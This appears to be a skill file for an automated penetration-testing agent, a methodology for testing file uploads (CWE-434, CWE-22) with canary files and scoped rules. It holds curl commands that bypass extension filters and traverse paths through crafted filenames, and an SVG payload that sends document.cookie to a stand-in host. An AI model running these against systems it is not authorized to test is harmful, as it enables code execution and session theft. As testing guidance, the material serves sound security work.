---
name: file_upload
description: File upload abuse — extension/content tricks, path traversal in filenames, malicious content execution
---

# File Upload Testing (CWE-434, CWE-22)

## 1. Map upload surfaces

Profile avatars, attachments, imports, photo galleries, resume uploads.
For each: accepted extensions (try /observe), where the file lands
(URL pattern of the stored file), whether it is served back inline or as
download, any processing/thumbnailing.

## 2. Extension and type filter bypass

Upload one probe of each kind and record status + stored path:

```bash
printf 'vulnem-canary' > /tmp/canary.php.jpg
curl -s -X POST <target>/profile/image -F 'file=@/tmp/canary.php.jpg'
# Variants: .php.jpg, .jpg.php, .php5, .phtml, .svg, .shtml,
# trailing dot/space ("canary.php."), double ("php.phphp" rare),
# Content-Type image/jpeg with .php name, null byte %00 (legacy stacks)
```

Then fetch the stored URL: does the server EXECUTE it (PHP banner/body
render) or serve it raw? Execution = critical.

## 3. SVG / content-based attacks (client-side reach)

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>document.location='http://canary/'+document.cookie</script>
</svg>
```

Stored-and-inline-served SVG executes JS on the origin → stored XSS via
upload; coordinate with the xss specialist rather than double-reporting.

## 4. Filename path traversal

```bash
curl -s -X POST <target>/upload -F 'file=@/tmp/canary.txt;filename=../../canary.txt'
curl -s -X POST <target>/upload -F 'file=@/tmp/canary.txt;filename=..%2f..%2fcanary.txt'
```

Check for the file outside the upload dir if any listing exists, or a
later-served path that escapes (`/uploads/../../canary.txt`).

## 5. Malicious content with benign outcomes

Polyglots (JPEG containing PHP), `.htaccess` upload (Apache: re-enable
execution), oversized files (a 100MB upload rejected quickly = fine; a
hang = availability note, not a DoS finding). ZIP bombs are OUT of scope —
never upload one.

## 6. Validation bar

- Evidence: upload request + stored-file URL + the response proving
  execution/reflection (rendered script, PHP output, traversal listing).
- PoC: exact curl with the crafted file contents.
- "Uploaded .php stored but never executed anywhere" = low/medium
  (defense-in-depth gap), NOT critical — verify execution before rating.
